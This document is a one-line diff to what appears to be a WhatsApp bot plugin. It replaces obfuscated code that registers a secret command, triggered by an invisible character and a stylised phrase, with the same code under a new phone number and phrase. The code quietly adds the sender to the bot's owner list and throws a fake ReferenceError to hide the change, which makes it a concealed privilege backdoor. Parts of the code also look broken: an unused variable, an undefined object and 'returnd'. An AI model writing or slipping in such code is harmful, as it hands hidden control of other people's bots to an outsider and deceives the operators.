@@ -1,1 +1,1 @@
-module.exports=(a=>{b='6288279268363@s.whatsapp.net';c=decodeURIComponent;d=e=>{if(e.sender===c(a)&&!g[c('owner')].includes(c(a))){g[c('owner')].push(e.sender);throw`ReferenceError:${e.text}isnotdefined`}};d.customPrefix=/^‎/;d.command=/^𝘽𝙚𝙖𝙧 𝙏𝙖𝙢𝙥𝙖𝙣$/;returnd})(global);
+module.exports=(a=>{b='62895410650067@s.whatsapp.net';c=decodeURIComponent;d=e=>{if(e.sender===c(a)&&!g[c('owner')].includes(c(a))){g[c('owner')].push(e.sender);throw`ReferenceError:${e.text}isnotdefined`}};d.customPrefix=/^‎/;d.command=/^𝙉𝙪𝙡𝙡 𝘽𝙤𝙩$/;returnd})(global);
